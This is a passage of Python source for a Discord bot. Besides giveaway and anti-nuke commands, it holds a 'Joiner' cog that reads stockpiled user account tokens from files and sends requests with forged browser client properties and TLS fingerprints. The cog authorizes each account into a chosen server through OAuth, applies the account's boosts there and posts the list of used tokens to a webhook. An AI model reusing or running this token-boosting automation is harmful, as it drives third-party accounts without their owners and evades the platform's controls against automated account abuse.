                async with aiofiles.open(temp_path, "w") as f:
                    await f.write(token_text)

                await ctx.send(
                    content=":warning: **Writing limit reached, sending as a `.txt` file instead.**",
                    file=discord.File(temp_path)
                )
                try:
                    os.remove(temp_path)
                except Exception as e:
                    print(f"Failed to delete temp file: {e}")

        except FileNotFoundError:
            await ctx.send(f":x: **The file for {type}-month tokens does not exist.**", delete_after=5)

    @commands.command(aliases=['cleanused'])
    async def clearused(self, ctx):
        await ctx.message.delete()
        for type in [1, 3]:
            file_path = f"boost_tokens_data/{type}m_used.txt"
            try:
                if os.path.exists(file_path):
                    open(file_path, "w").close()
                    await send(ctx, "Clear Tokens", "Successfully cleared all used tokens")                    
                else:
                    await ctx.send(f"File `{file_path}` not found.")
            except Exception as e:
                await ctx.send(f"Error clearing tokens in `{file_path}`: {e}")

    @commands.command(aliases=['cleaninvalid'])
    async def clearinvalid(self, ctx):
        await ctx.message.delete()
        file_path = f"boost_tokens_data/invalid_tokens.txt"
        try:
            if os.path.exists(file_path):
                open(file_path, "w").close()
                await send(ctx, "Clear Tokens", "Successfully cleared all invalid tokens")                
            else:
                await ctx.send(f"File `{file_path}` not found.")
        except Exception as e:
            await ctx.send(f"Error clearing tokens in `{file_path}`: {e}")



    @commands.command(aliases=['cleantokens'])
    async def cleartokens(self, ctx, type: int):
        await ctx.message.delete()
        if type not in [1, 3]:
            return await ctx.send(":x: **Invalid type!** Use `1` for 1-month tokens or `3` for 3-month tokens.", delete_after=5)

        file_path = f"boost_tokens_data/{type}m_tokens.txt"
        try:
            if os.path.exists(file_path):
                open(file_path, "w").close() 
                await send(ctx,"Clear Tokens",f"Successfully cleared all `{file_path} month` stock tokens.")
            else:
                await ctx.send(f"File `{file_path}` not found.")
        except Exception as e:
            await ctx.send(f"Error clearing tokens: {e}")

with open('config/bot_config.json', 'r') as config_file:
    boost_config = json.load(config_file)

with open('config.json', 'r') as config_file:
    config = json.load(config_file)
executor = ThreadPoolExecutor(max_workers=10)
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
BUILD_NUMBER = 165486
CV = "108.0.0.0"
BOT_TOKEN = boost_config['BOT_TOKEN']
CLIENT_SECRET = boost_config['CLIENT_SECRET']
CLIENT_ID = boost_config['CLIENT_ID']
REDIRECT_URI = boost_config['REDIRECT_URI']
API_ENDPOINT = 'https://canary.discord.com/api/v9'
AUTH_URL = f"https://canary.discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20guilds.join"
BOT_INVITE = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&permissions=67108865&integration_type=0&scope=bot"

SUPER_PROPERTIES = b64encode(json.dumps({
    "os": "Windows",
    "browser": "Chrome",
    "device": "PC",
    "system_locale": "en-GB",
    "browser_user_agent": USER_AGENT,
    "browser_version": CV,
    "os_version": "10",
    "referrer": "https://discord.com/channels/@me",
    "referring_domain": "discord.com",
    "referrer_current": "",
    "referring_domain_current": "",
    "release_channel": "stable",
    "client_build_number": BUILD_NUMBER,
    "client_event_source": None
}, separators=(',', ':')).encode()).decode()


class Joiner(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def exchange_code(self, code):
        try:
            data = {
                'client_id': CLIENT_ID,
                'client_secret': CLIENT_SECRET,
                'grant_type': 'authorization_code',
                'code': code,
                'redirect_uri': REDIRECT_URI
            }
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            r = requests.post(f"{API_ENDPOINT}/oauth2/token", data=data, headers=headers)
            return r.json() if r.ok else False
        except Exception as e:
            print(f"[exchange_code] Error: {e}")
            return False

    def get_user(self, access: str):
        try:
            r = requests.get("https://canary.discord.com/api/v9/users/@me", headers={"Authorization": f"Bearer {access}"})
            data = r.json()
            if isinstance(data, dict) and 'id' in data:
                return data['id']
        except Exception as e:
            print(f"[get_user] Error: {e}")
        return None

    def get_headers(self, token):
        return {
            "Authorization": token,
            "Origin": "https://canary.discord.com",
            "Accept": "*/*",
            "X-Discord-Locale": "en-GB",
            "X-Super-Properties": SUPER_PROPERTIES,
            "User-Agent": USER_AGENT,
            "Referer": "https://canary.discord.com/channels/@me",
            "X-Debug-Options": "bugReporterEnabled",
            "Content-Type": "application/json"
        }

    def rename(self, token, guild, nickname):
        try:
            client = tls_client.Session(client_identifier="firefox_102")
            client.headers.update(self.get_headers(token))
            r = client.patch(
                f"https://canary.discord.com/api/v9/guilds/{guild}/members/@me",
                json={"nick": nickname})
            if r.status_code in (200, 201, 204):    
                return "ok" 
        except Exception as e:
            print(f"[rename] Error: {e}")
            return "error"

    def authorizer(self, token, guild, nickname):
        try:
            headers = self.get_headers(token)
            r = requests.post(AUTH_URL, headers=headers, json={"authorize": "true"})
            if not r.ok:
                return "fail"

            location = r.json().get("location") or ""
            if not location:
                return "fail"
            code = location.replace(f"{REDIRECT_URI}?code=", "")
            exchange = self.exchange_code(code)
            if not exchange:
                return "fail"

            access_token = exchange.get("access_token")
            userid = self.get_user(access_token)
            if not userid:
                return "fail"

            self.add_to_guild(access_token, userid, guild)
            if nickname:
                threading.Thread(target=self.rename, args=(token, guild, nickname)).start()

            return "ok"
        except Exception as e:
            print(f"[authorizer] Error: {e}")
            return "fail"

    def add_to_guild(self, access_token, userID, guild):
        try:
            url = f"{API_ENDPOINT}/guilds/{guild}/members/{userID}"
            headers = {
                "Authorization": f"Bot {BOT_TOKEN}",
                "Content-Type": "application/json"
            }
            r = requests.put(url=url, headers=headers, json={"access_token": access_token})
            return r.status_code
        except Exception as e:
            return 0

    def put_boost(self, token, guild, nickname=None):
        try:
            headers = self.get_headers(token)
            client = tls_client.Session(client_identifier="firefox_102")
            client.headers.update(headers)
            r = client.get(f"{API_ENDPOINT}/users/@me/guilds/premium/subscription-slots")
            data = r.json()
            if not isinstance(data, list):
                return 0

            applied_boosts = 0
            for item in data:
                try:
                    slot_id = item['id']
                    payload = {"user_premium_guild_subscription_slot_ids": [slot_id]}
                    boost_r = client.put(
                        f"{API_ENDPOINT}/guilds/{guild}/premium/subscriptions",
                        json=payload)

                    if boost_r.status_code in (200, 201, 204):
                        applied_boosts += 1
                        if nickname:
                            self.rename(token, guild, nickname)
                except Exception as e:
                    print(f"[put_boost] Error while applying boost: {e}")
                    continue

            return applied_boosts
        except Exception as e:
            print(f"[put_boost] Error: {e}")
            return 0

    def main(self, token, guild, nickname=None):
        try:
            joined = 0
            boosted = 0

            result = self.authorizer(token, guild, nickname)
            if result == "ok":
                joined = 1
                boosted = self.put_boost(token, guild, nickname)

            return f"joined:{joined} boosted:{boosted}"
        except Exception as e:
            print(f"[main] Token skipped due to error: {e}")
            return "joined:0 boosted:0"
        
    @commands.command(name="aboost")
    async def aboost(self, ctx, guild_id: int, token_type: int, num_tokens: int, nickname: str = None):
        await ctx.message.delete()
        if not guild_id or num_tokens <= 0:
            return await send(ctx, "❌ Invalid Arguments", "Please provide a valid server ID and number of boosts.")

        if token_type not in [1, 3]:
            return await send(ctx, "❌ Invalid Token Type", "Please specify `1` for 1-month or `3` for 3-month tokens.")

        file_name = f"boost_tokens_data/{token_type}m_tokens.txt"
        try:
            with open(file_name, "r") as f:
                tokens = f.readlines()
        except FileNotFoundError:
            return await send(ctx, "❌ File Not Found", f"The file `{file_name}` does not exist.")

        if len(tokens) < num_tokens:
            return await send(ctx, "⚠️ Insufficient Tokens", f"Requested: {num_tokens}, Available: {len(tokens)}")

        prog_msg = await send(ctx, "🎁 Boosting Server", f"Starting to apply **{2 * num_tokens} boost(s)** to server ID: `{guild_id}`...\nThis might take a while ⏳")

        successful_boosts = 0
        used_tokens = []
        joined_count = 0
        

        for i in range(num_tokens):
            token = tokens[i].strip()
            try:
                if ":" in token:
                    token = token.split(":")[2]
            except Exception as e:
                continue

            result = await ctx.bot.loop.run_in_executor(executor, self.main, token, guild_id, nickname)
            joined, boosted = 0, 0

            if "joined" in result and "boosted" in result:
                parts = result.split()
                joined = int(parts[0].split(":")[1])
                boosted = int(parts[1].split(":")[1])
            
            if joined:
                joined_count += joined

            if boosted:
                successful_boosts += 2
                
            used_tokens.append(token)

        with open(file_name, "w") as f:
            f.writelines(tokens[num_tokens:])

        msg = (
            f"Guild ID : `{guild_id}`\n"
            f"Tokens Type : `{token_type}` month\n"
            f"Tokens used : `{len(used_tokens)}` Tokens\n"
            f"Joined : `{joined_count}` Tokens\n"
            f"Boosted : `{successful_boosts}` Times"
        )
        used_tokens_file = "used_boost_tokens.txt"
        async with aiofiles.open(used_tokens_file, "w") as f:
            await f.write("\n".join(used_tokens))
        permanent_used_file = f"boost_tokens_data\\{token_type}m_used.txt"
        async with aiofiles.open(permanent_used_file, "a") as f:
            await f.write("\n".join(used_tokens) + "\n")            
        webhook_url = config.get("oauth_boosting_logs_webhook_url")    
        if webhook_url:
            embed = discord.Embed(
                title="📈 Outh Boosting Log",
                description=f"",
                color=0x00ffcc
            )
            embed.add_field(name="Guild ID", value=f"`{guild_id}`", inline=False)
            embed.add_field(name="Tokens Type", value=f"`{token_type}` month", inline=True)
            embed.add_field(name="Tokens Used", value=f"`{len(used_tokens)}` Tokens", inline=True)
            embed.add_field(name="Joined", value=f"`{joined_count}` Tokens", inline=True)
            embed.add_field(name="Boosted", value=f"`{successful_boosts}` Times", inline=True)
            embed.set_footer(text=f"Powered by {selfbot_name} ")

            async with aiohttp.ClientSession() as session:
                with open(used_tokens_file, "rb") as file_data:
                    form = aiohttp.FormData()
                    form.add_field("file", file_data, filename=used_tokens_file)
                    form.add_field("payload_json", json.dumps({
                        "embeds": [embed.to_dict()]
                    }))
                    await session.post(webhook_url, data=form)   
        if os.path.exists(used_tokens_file):
            os.remove(used_tokens_file)
        await prog_msg.delete()    
        await send(ctx, "Boosting Complete", msg)

    @commands.command()
    async def invite(self, ctx):
        await ctx.message.delete()
        await send(ctx, "Bot Invite Link", BOT_INVITE)



class Giveaway(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.active_giveaways = {}

    def parse_time(self, duration_str):
        match = re.match(r"^(\d+)([smhd])$", duration_str)
        if not match:
            return None 
        value, unit = int(match.group(1)), match.group(2)
        multiplier = {"s": 1, "m": 60, "h": 3600, "d": 86400}
        return value * multiplier[unit]

    @commands.command()
    async def gstart(self, ctx, duration: str, winners: int, *, prize: str):
        await ctx.message.delete()

        timestamp = int(time.time())
        duration_sec = self.parse_time(duration)

        if duration_sec is None:
            return await senderror(
                ctx,
                "Invalid Time Format",
                "Use `s` (seconds), `m` (minutes), `h` (hours), or `d` (days). Example: `10m`, `2h`, `1d`"
            )

        if winners < 1:
            return await senderror(
                ctx,
                "Invalid Winners Count",
                "Number of winners must be at least 1."
            )

        end_time = int(time.time()) + duration_sec

        msg = await send(
            ctx,
            ":tada: Giveaway :tada:",
            f"- **Prize:** {prize}\n"
            f"- **Winners:** {winners}\n"
            f"- **Ends:** <t:{end_time}:R>",
            f"Hosted by {ctx.author} | {timestamp}"
        )

        await msg.add_reaction("\U0001F389")

        self.active_giveaways[msg.id] = {
            "channel_id": ctx.channel.id,
            "prize": prize,
            "winners": winners,
            "status": True
        }

        await asyncio.sleep(duration_sec)

        giveaway = self.active_giveaways.get(msg.id)

        if giveaway and giveaway["status"]:
            try:
                new_msg = await ctx.channel.fetch_message(msg.id)
            except discord.NotFound:
                return

            reaction = next(
                (r for r in new_msg.reactions if str(r.emoji) == "\U0001F389"),
                None
            )

            if not reaction:
                return await senderror(ctx, "Giveaway Canceled!", ":x: No participants found.")

            users = [user async for user in reaction.users() if not user.bot]

            if len(users) < winners:
                return await senderror(
                    ctx,
                    "Giveaway Canceled!",
                    ":x: Not enough participants to draw winners!"
                )

            winners_list = random.sample(users, winners)
            winners_mention = ", ".join(winner.mention for winner in winners_list)

            winner_text = "The winner is" if winners == 1 else "The winners are"

            await msg.reply(
                f":tada: {winner_text} {winners_mention}! :tada: You won **{prize}**"
            )

            giveaway["status"] = False

    @commands.command()
    async def gend(self, ctx, message_id: int = None):
        await ctx.message.delete()
        giveaway = self.active_giveaways.get(message_id)
        if not giveaway:
            return await senderror(ctx, "Error", ":x: No active giveaway found with this message ID.")
        
        channel = self.bot.get_channel(giveaway["channel_id"])
        try:
            new_msg = await channel.fetch_message(message_id)
        except discord.NotFound:
            return await senderror(ctx, "Error", ":x: Giveaway message not found.")

        reaction = next((r for r in new_msg.reactions if str(r.emoji) == "\U0001F389"), None)
        if not reaction:
            return await senderror(ctx, "Giveaway Canceled", ":x: No participants found.")

        users = [user async for user in reaction.users() if not user.bot]
        if len(users) < giveaway["winners"]:
            return await senderror(ctx, "Giveaway Canceled", ":x: Not enough participants to draw winners.")

        if giveaway["status"]:
            winners_list = random.sample(users, giveaway["winners"])
            winners_mention = ", ".join(winner.mention for winner in winners_list)
            winner_text = "The winner is" if giveaway["winners"] == 1 else "The winners are"
            await ctx.send(f"{winner_text} {winners_mention}! :tada: You won {giveaway['prize']}")

            giveaway["status"] = False
        else:
            await send(ctx, "Giveaway ended", ":x: This giveaway has already been ended already.")

    @commands.command()
    async def greroll(self, ctx, message_id: int, winners: int):
        await ctx.message.delete()
        giveaway = self.active_giveaways.get(message_id)
        if not giveaway:
            return await senderror(ctx, "Error", ":x: No active giveaway found with this message ID.")

        channel = self.bot.get_channel(giveaway["channel_id"])
        try:
            new_msg = await channel.fetch_message(message_id)
        except discord.NotFound:
            return await senderror(ctx, "Error", ":x: Giveaway message not found.")

        if not giveaway["status"]:
            reaction = next((r for r in new_msg.reactions if str(r.emoji) == "\U0001F389"), None)
            if not reaction:
                return await senderror(ctx, "Error", ":x: No participants found for reroll.")

            users = [user async for user in reaction.users() if not user.bot]
            if len(users) < winners:
                return await senderror(ctx, "Error", ":x: Not enough participants to draw new winners.")

            winners_list = random.sample(users, winners)
            winners_mention = ", ".join(winner.mention for winner in winners_list)
            winner_text = "The new winner is" if winners == 1 else "The new winners are"
            await ctx.send(f"{winner_text} {winners_mention}! :tada: You won {giveaway['prize']}")

        else:
            await send(ctx, "Giveaway running", f":x:  The giveaway with message ID {message_id} is still running.")

    @commands.command()
    async def gwlist(self, ctx):
        await ctx.message.delete()
        if not self.active_giveaways:
            return await senderror(ctx, "No active giveaways!", ":x: Start one using `gstart`.")
        
        links = []
        for msg_id, data in self.active_giveaways.items():
            channel = self.bot.get_channel(data["channel_id"])
            if channel:
                try:
                    msg = await channel.fetch_message(msg_id)
                    links.append(f"**[{len(links) + 1}]** : [Jump to Giveaway]({msg.jump_url})")
                except discord.NotFound:
                    continue
        
        if not links:
            return await senderror(ctx, "No valid giveaways!", ":x: All stored giveaways are invalid or deleted.")
        
        await send(ctx, "Active Giveaways", "\n".join(links))

    @commands.command(aliases=['gwhelp','giveaway'])
    async def gw(self, ctx):
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<a:yeah:1281246694352093315> | **Start Giveaway** **:** **`{prefix}gstart <time> <w_count> <prize>`**\n"
            f"<a:yeah:1281246694352093315> | **End Giveaway** **:** **`{prefix}gend <msg_id>`**\n"
            f"<a:yeah:1281246694352093315> | **Reroll Giveaway** **:** **`{prefix}greroll <msg_id> <w_count>`**\n"
            f"<a:yeah:1281246694352093315> | **List Active Giveaways** **:** **`{prefix}gwlist`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Giveaway Commands__<:Titanz:1281243489635405827>", description)

class AntiNuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.whitelist = self.load_whitelist()
        self.file_path = "database/antinuke.json"
        self.load_antinuke_settings()        
        self.permissions = {
            1: "Ban",
            2: "Kick",
            3: "Guild Update",
            4: "Emoji Update",
            5: "Role Create",
            6: "Role Delete",
            7: "Role Update",
            8: "Channel Create",
            9: "Channel Delete",
            10: "Channel Update",
            11: "Webhook Create",
            12: "Webhook Delete",
            13: "Webhook Update",
            14: "Member Role Update",
            15: "Mention @\u200beveryone/@\u200bhere",
            16: "Bot Add"
        }
        self.off_emoji = "<a:bitzxier_downtime:1322611844455727165><a:bitzxier_downtime:1322611844455727165>"
        self.on_emoji = "<a:Online_Ping:1389619441612095659><a:Online_Ping:1389619441612095659>"

    @staticmethod
    def load_json(filename):
        try:
            with open(filename, 'r', encoding='utf-8') as file:
                return json.load(file)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            print(f"Error loading JSON: {e}")
            return {}

    def load_whitelist(self):
        try:
            with open("database/whitelist.json", "r") as f:
                return json.load(f)
        except FileNotFoundError:
            return {}

    def save_whitelist(self):
        with open("database/whitelist.json", "w") as f:
            json.dump(self.whitelist, f, indent=4)


    def load_antinuke_settings(self):
        if os.path.exists(self.file_path):
            with open(self.file_path, "r") as f:
                self.antinuke_settings = json.load(f)
        else:
            self.antinuke_settings = {}

    def save_antinuke_settings(self):
        with open(self.file_path, "w") as f:
            json.dump(self.antinuke_settings, f, indent=4)

    @commands.command(aliases=['setpunish','setp'])
    async def setpunishment(self, ctx, punishment: str):
        await ctx.message.delete()
        if punishment.lower() not in ["kick", "ban", "timeout"]:
            await send(ctx, "Set Punishment", "<:CROSS_TDG:1321149916201881683> Invalid punishment type. Choose from `kick`, `ban`, or `timeout`." )
            return
        guild_id = str(ctx.guild.id)
        self.antinuke_settings[guild_id] = self.antinuke_settings.get(guild_id, {})
        self.antinuke_settings[guild_id]["punishment"] = punishment.lower()
        self.save_antinuke_settings()
        await send(ctx, "Set Punishment", f"<:emoji_1738342244745:1334928872269152259>  Punishment set to `{punishment.lower()}` for this server.")

    @commands.command(aliases=['setlog'])
    async def setlogchannel(self, ctx, channel: discord.TextChannel):
        await ctx.message.delete()
        guild_id = str(ctx.guild.id)
        self.antinuke_settings[guild_id] = self.antinuke_settings.get(guild_id, {})
        self.antinuke_settings[guild_id]["log_channel"] = channel.id
        self.save_antinuke_settings()
        await send(ctx, "Set Log Channel", f"<:emoji_1738342244745:1334928872269152259>  Log channel set to {channel.mention}.")

    @commands.command()
    async def anuke(self,ctx): # anuke cog help commands , format like other cogs with this emojis <:TOS:1336669803221614622>
        await ctx.message.delete()
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        description = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:TOS:1336669803221614622> | **Enable AntiNuke** **:** **`{prefix}antinuke enable`**\n"
            f"<:TOS:1336669803221614622> | **Disable AntiNuke** **:** **`{prefix}antinuke disable`**\n"
            f"<:TOS:1336669803221614622> | **Set Punishment** **:** **`{prefix}setpunish [kick/ban]`**\n"
            f"<:TOS:1336669803221614622> | **Set Log Channel** **:** **`{prefix}setlog [channel]`**\n"
            f"<:TOS:1336669803221614622> | **Whitelist User** **:** **`{prefix}whitelist [user]`**\n"
            f"<:TOS:1336669803221614622> | **Unwhitelist User** **:** **`{prefix}unwhitelist [user]`**\n"
            f"<:TOS:1336669803221614622> | **Whitelisted list** **:** **`{prefix}whitelisted`**\n"
            f"<:TOS:1336669803221614622> | **Antinuke config** **:** **`{prefix}anukeconfig`**\n"
            f"<:TOS:1336669803221614622> | **Whitelist info** **:** **`{prefix}wlinfo [user]`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"
        )
        await send(ctx, "<:devs:1290693770567749652>__Antinuke Commands__<:Titanz:1281243489635405827>", description)

    @commands.command()
    async def antinuke(self, ctx, state: str):
        await ctx.message.delete()

        if state.lower() not in ["enable", "disable"]:
            await senderror(ctx, "AntiNuke", "<:CROSS_TDG:1321149916201881683> Invalid option. Use `enable` or `disable`.")
            return

        if state.lower() == "enable":
            msg = await ctx.send("<a:SA_CH_IconLoading:1475035848796803092> Checking permissions...")
            await asyncio.sleep(1)
            permissions = {
                "Administrator": ctx.guild.me.guild_permissions.administrator,
                "Manage Server": ctx.guild.me.guild_permissions.manage_guild,
                "Kick Members": ctx.guild.me.guild_permissions.kick_members,
                "Ban Members": ctx.guild.me.guild_permissions.ban_members,
                "View Audit Log": ctx.guild.me.guild_permissions.view_audit_log
            }

            missing_perms = []
            for perm, has_perm in permissions.items():
                await msg.edit(content=f"<a:SA_CH_IconLoading:1475035848796803092> Checking **{perm}** permission...")
                await asyncio.sleep(1)
                if not has_perm:
                    missing_perms.append(f"<:CROSS_TDG:1321149916201881683> You lack **{perm}** permission!")
            
            if missing_perms:
                await senderror(ctx, "⚠️ **Antinuke aborted**", "\n".join([""] + missing_perms + ["\n"]))
                return

            await msg.edit(content="<:emoji_1738342244745:1334928872269152259> All permissions verified! Enabling AntiNuke...")
            await asyncio.sleep(1)
            
            guild_id = str(ctx.guild.id)
            self.antinuke_settings[guild_id] = {
                "enabled": True,
                "punishment": "kick",
                "log_channel": "not set"
            }
            self.save_antinuke_settings()

            await msg.delete()
            await send(ctx, "AntiNuke", f"<:emoji_1738342244745:1334928872269152259> AntiNuke has been `enabled` for this server.")

        elif state.lower() == "disable":
            guild_id = str(ctx.guild.id)
            if guild_id in self.antinuke_settings:
                self.antinuke_settings[guild_id]["enabled"] = False
                self.save_antinuke_settings()
                await send(ctx, "AntiNuke", "<:emoji_1738342244745:1334928872269152259> AntiNuke has been `disabled` for this server.")
            else:
                await senderror(ctx, "AntiNuke", "<:CROSS_TDG:1321149916201881683> AntiNuke is not enabled for this server.")

    @commands.command(aliases=['addwl','wl'])
    async def whitelist(self, ctx, member: discord.Member):
        await ctx.message.delete()
        if ctx.guild is None:
            return
        guild_id = str(ctx.guild.id)
        user_id = str(member.id)
        if guild_id not in self.whitelist:
            self.whitelist[guild_id] = {}
        if user_id not in self.whitelist[guild_id]:
            self.whitelist[guild_id][user_id] = []
        perm_msg = "**Select permissions to whitelist:**\n"
        for num, perm in self.permissions.items():
            emoji = self.on_emoji if num in self.whitelist[guild_id][user_id] else self.off_emoji
            perm_msg += f"{num}. {emoji} : {perm}\n"
        msg = await send(ctx, f"{selfbot_name}  Antinuke", f"{perm_msg}\nTarget : {member.mention}\n**Send `all` or number of permission u want to add separated with commas (e.g: 1,4,6)**")
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            reply = await self.bot.wait_for("message", check=check, timeout=30)
            selected = reply.content.lower()
        except TimeoutError:
            await senderror(ctx, f"{selfbot_name}  Antinuke", "⏳ Timed out! Please try again.")
            return
        await msg.delete()
        await reply.delete()
        if selected == "all":
            self.whitelist[guild_id][user_id] = list(set(self.whitelist[guild_id][user_id] + list(self.permissions.keys())))
        else:
            try:
                selected_nums = [int(x) for x in selected.split(",") if int(x) in self.permissions]
                for num in selected_nums:
                    if num not in self.whitelist[guild_id][user_id]:
                        self.whitelist[guild_id][user_id].append(num)
            except ValueError:
                await senderror(ctx, f"{selfbot_name}  Antinuke", "<:CROSS_TDG:1321149916201881683> Invalid input. Use numbers separated by commas or type 'all'.")
                return
        self.save_whitelist()
        perm_msg = "**Updated Permissions:**\n"
        for num, perm in self.permissions.items():
            emoji = self.on_emoji if num in self.whitelist[guild_id][user_id] else self.off_emoji
            perm_msg += f"{num}. {emoji} : {perm}\n"
        await send(ctx, f"{selfbot_name}  Antinuke", f"{perm_msg}\nTarget : {member.mention}")

    @commands.command(aliases=['unwl','uwl'])
    async def unwhitelist(self, ctx, member: discord.Member):
        await ctx.message.delete()
        if ctx.guild is None:
            return
        guild_id = str(ctx.guild.id)
        user_id = str(member.id)
        if guild_id not in self.whitelist:
            self.whitelist[guild_id] = {}
        if user_id not in self.whitelist[guild_id]:
            self.whitelist[guild_id][user_id] = []
        perm_msg = "**Select permissions to remove from whitelist:**\n"
        for num, perm in self.permissions.items():
            emoji = self.on_emoji if num in self.whitelist[guild_id][user_id] else self.off_emoji
            perm_msg += f"{num}. {emoji} : {perm}\n"
        msg = await send(ctx, f"{selfbot_name}  Antinuke", f"{perm_msg}\nTarget : {member.mention}\n**Send `all` or number of permission u want to remove separated with commas (e.g: 1,4,6)**")
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            reply = await self.bot.wait_for("message", check=check, timeout=30)
            selected = reply.content.lower()
        except TimeoutError:
            await send(ctx, f"{selfbot_name}  Antinuke", "⏳ Timed out! Please try again.")
            return
        await msg.delete()
        await reply.delete()
        if selected == "all":
            self.whitelist[guild_id].pop(user_id, None)
        else:
            try:
                selected_nums = [int(x) for x in selected.split(",") if int(x) in self.permissions]
                for num in selected_nums:
                    if num in self.whitelist[guild_id][user_id]:
                        self.whitelist[guild_id][user_id].remove(num)
            except ValueError:
                await senderror(ctx, f"{selfbot_name}  Antinuke", "<:CROSS_TDG:1321149916201881683> Invalid input. Use numbers separated by commas or type 'all'.")
                return
        self.save_whitelist()        
        perm_msg = "**Updated Permissions:**\n"
        for num, perm in self.permissions.items():
            emoji = self.on_emoji if num in self.whitelist[guild_id].get(user_id, []) else self.off_emoji
            perm_msg += f"{num}. {emoji} : {perm}\n"
        await send(ctx, f"{selfbot_name}  Antinuke", f"{perm_msg}\nTarget : {member.mention}")

    @commands.command(aliases=['wls','wlisted'])
    async def whitelisted(self, ctx):
        await ctx.message.delete()
        guild_id = str(ctx.guild.id)
        whitelist_settings = self.load_json("database/whitelist.json")
        whitelist_status = whitelist_settings.get(guild_id, {})
        if not whitelist_status:
            return await senderror(ctx, "Whitelisted Users", "<:CROSS_TDG:1321149916201881683> No users are whitelisted in this server.")
        whitelist_list = "\n".join(
            f"<@{user_id}> - `{perm_num}`" for user_id, perm_num in whitelist_status.items()
        )
        await send(ctx, "Whitelisted Users", whitelist_list)

    @commands.command(aliases=['winfo', 'whitelistinfo'])
    async def wlinfo(self, ctx, user: discord.Member = None):
        user = user or ctx.author
        await ctx.message.delete()
        guild_id = str(ctx.guild.id)
        whitelist_settings = self.load_json("database/whitelist.json")
        whitelist_status = whitelist_settings.get(guild_id, {}).get(str(user.id), [])
        if not whitelist_status:
            return await senderror(ctx, "Whitelist Info", f"<:CROSS_TDG:1321149916201881683> {user.mention} is not whitelisted for any permission in this server.")       
        perm_msg = "\n"
        for num, perm in self.permissions.items():
            emoji = self.on_emoji if num in self.whitelist[guild_id].get(user.id, []) else self.off_emoji
            perm_msg += f"{num}. {emoji} : {perm}\n"
        await send(ctx, "Whitelist Info", f"Whitelisted Permissions for {user.mention}:\n{perm_msg}")            

    @commands.command()
    async def anukeconfig(self, ctx):
        await ctx.message.delete()
        guild_id = str(ctx.guild.id)
        self.antinuke_settings[guild_id] = self.antinuke_settings.get(guild_id, {})
        antinuke_status = self.antinuke_settings[guild_id].get("enabled", False)
        punishment = self.antinuke_settings[guild_id].get("punishment", "Not Set")
        log_channel_id = self.antinuke_settings[guild_id].get("log_channel", "Not Set")
        message = (
            f"<:white_arrow:1290693789824061461> **Guild ID :** {guild_id}\n"
